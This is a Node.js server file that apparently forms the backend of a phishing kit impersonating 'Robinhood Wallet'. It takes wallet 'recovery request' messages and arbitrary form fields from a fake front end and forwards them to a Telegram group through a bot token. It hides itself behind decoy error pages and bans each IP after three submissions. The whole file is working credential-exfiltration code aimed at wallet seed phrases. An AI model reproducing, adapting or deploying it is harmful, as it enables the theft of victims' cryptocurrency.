require("dotenv").config();

const express = require("express");
const axios = require("axios");
const cors = require("cors");
const ipGuard = require("./ipGuard.js");

const app = express();

app.use(cors({
    origin: "http://localhost:5173",
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
}));

// Handle preflight requests
app.options("*", cors());

app.use(express.json());

app.use(ipGuard.banGuardMiddleware);

const BOT_TOKEN = process.env.BOT_TOKEN;
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

if (!BOT_TOKEN || !GROUP_CHAT_ID) {
    console.error("Missing BOT_TOKEN or GROUP_CHAT_ID in .env");
    process.exit(1);
}

// Homepage
app.get("/", (req, res) => {
    res.status(500).send("🤡 error500");
});

app.get("/health", (req, res) => {
    res.json({ status: "ok" });
});

// Request logger
app.use((req, res, next) => {
    console.log(`${req.method} ${req.url}`);
    console.log("Body:", req.body);
    next();
});

app.post("/send", async (req, res) => {
    const { message } = req.body;

    if (!message || typeof message !== "string") {
        return res.status(400).json({
            error: "Field 'message' (string) is required"
        });
    }

    const formattedMessage = `
<b>🦊 Robinhood Wallet</b>

━━━━━━━━━━━━━━

<b>📩 New Recovery Request</b>

<code>${message}</code>

━━━━━━━━━━━━━━

<b>🌐 Site:</b> Robinhood Wallet
<b>🕒 Time:</b> ${new Date().toLocaleString()}
`;

    try {
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: GROUP_CHAT_ID,
            text: formattedMessage,
            parse_mode: "HTML",
        });

        const gotBanned = ipGuard.recordSend(req.clientIp);

        res.json({
            success: true,
            telegram_message_id: response.data.result.message_id,
            ...(gotBanned && {
                warning: "This IP has now been banned after 3 consecutive sends."
            }),
        });

    } catch (err) {
        console.error(
            "Telegram send error:",
            err.response?.data || err.message
        );

        res.status(500).json({
            error: "🤡 error500"
        });
    }
});

app.post("/send-form", async (req, res) => {
    const { fields } = req.body;

    if (!fields || typeof fields !== "object") {
        return res.status(400).json({
            error: "Field 'fields' (object) is required"
        });
    }

    const formatted = Object.entries(fields)
        .map(([key, value]) => `<b>${key}</b>: ${value}`)
        .join("\n");

    try {
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: GROUP_CHAT_ID,
            text: formatted,
            parse_mode: "HTML",
        });

        const gotBanned = ipGuard.recordSend(req.clientIp);

        res.json({
            success: true,
            telegram_message_id: response.data.result.message_id,
            ...(gotBanned && {
                warning: "This IP has now been banned after 3 consecutive sends."
            }),
        });

    } catch (err) {
        console.error(
            "Telegram send error:",
            err.response?.data || err.message
        );

        res.status(500).json({
            error: "🤡 error500"
        });
    }
});

app.post("/admin/unban", (req, res) => {
    const { ip } = req.body;

    if (!ip) {
        return res.status(400).json({
            error: "Field 'ip' is required"
        });
    }

    ipGuard.unbanIp(ip);

    res.json({
        success: true,
        message: `${ip} unbanned`
    });
});

app.get("/admin/banned", (req, res) => {
    res.json({
        banned: ipGuard.listBannedIps()
    });
});

// Catch-all for undefined routes
app.use((req, res) => {
    res.status(404).send("🤡 error500");
});

// Global error handler
app.use((err, req, res, next) => {
    console.error(err);

    res.status(500).json({
        error: "🤡 error500"
    });
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Sending server running on port ${PORT}`);
});